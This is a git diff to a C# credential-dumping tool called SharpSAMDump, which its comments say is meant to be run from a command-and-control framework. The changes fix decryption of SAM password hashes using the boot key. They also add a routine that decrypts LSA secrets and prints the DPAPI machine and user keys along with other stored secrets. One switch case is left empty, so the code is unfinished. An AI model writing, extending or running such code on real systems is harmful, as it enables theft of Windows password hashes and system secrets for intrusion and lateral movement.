@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Security.Policy;
 
 namespace SharpSAMDump
 {
@@ -9,6 +10,7 @@ namespace SharpSAMDump
 #if DEBUG
             // no wrapping in debug mode so that exceptions are caught by the debugger
             SAMDump();
+            LSADump();
 #else
             // try-catch wrapped execution for invocations from C2
             SAMDumpIgnoringExceptions();
@@ -20,6 +22,7 @@ namespace SharpSAMDump
             try
             {
                 SAMDump();
+                LSADump();
             }
             catch (Exception ex)
             {
@@ -36,12 +39,12 @@ namespace SharpSAMDump
             byte[] blankNT = Util.FromHexString("31d6cfe0d16ae931b73c59d7e0c089c0");
 
             byte[] samKey = SAM.GetEncryptedPasswordEncryptionKey();
-            byte[] lsaKey = LSA.GetSecretKey();
-            byte[] passwordEncryptionKey = Crypto.UnprotectPasswordEncryptionKey(samKey, lsaKey);
-        
+            byte[] bootKey = LSA.GetBootKey();
+            byte[] passwordEncryptionKey = Crypto.UnprotectPasswordEncryptionKey(samKey, bootKey);
+
             foreach (SAMEntry entry in SAM.GetEntries())
             {
-                byte[] lmHash = Crypto.UnprotectNTHash(passwordEncryptionKey, entry.EncryptedLMHash, entry.Rid);
+                byte[] lmHash = Crypto.UnprotectLMHash(passwordEncryptionKey, entry.EncryptedLMHash, entry.Rid);
                 if (lmHash == null)
                 {
                     lmHash = blankLM;
@@ -54,6 +57,34 @@ namespace SharpSAMDump
                 }
 
                 Console.WriteLine($"{entry.AccountName}:{entry.Rid}:{Util.ToHexString(lmHash)}:{Util.ToHexString(ntHash)}:::");
+            }
+        }
+
+        public static void LSADump() {
+            byte[] bootKey = LSA.GetBootKey();
+            byte[] encryptedLsaKey = LSA.GetEncryptedLSAKey();
+            byte[] lsaKey = Crypto.UnprotectLSAKey(encryptedLsaKey, bootKey);
+
+            foreach (LSASecret secret in LSA.GetEntries())
+            {
+                byte[] plaintext = Crypto.UnprotectLSASecret(secret.EncryptedSecret, lsaKey);
+                DecryptedLSASecret blob = new DecryptedLSASecret(plaintext);
+
+                switch(secret.Name)
+                {
+                    case "DPAPI_SYSTEM":
+                        DPAPIBlob dpapi = new DPAPIBlob(blob.Data);
+                        Console.WriteLine($"DPAPI.MachineKey:{Util.ToHexString(dpapi.MachineKey)}");
+                        Console.WriteLine($"DPAPI.UserKey:{Util.ToHexString(dpapi.UserKey)}");
+                        break;
+
+                    case "$MACHINE.ACC":
+                        
+
+                    default:
+                        Console.WriteLine($"{secret.Name}:{Util.ToHexString(blob.Data)}");
+                        break;
+                }
             }
         }
     }
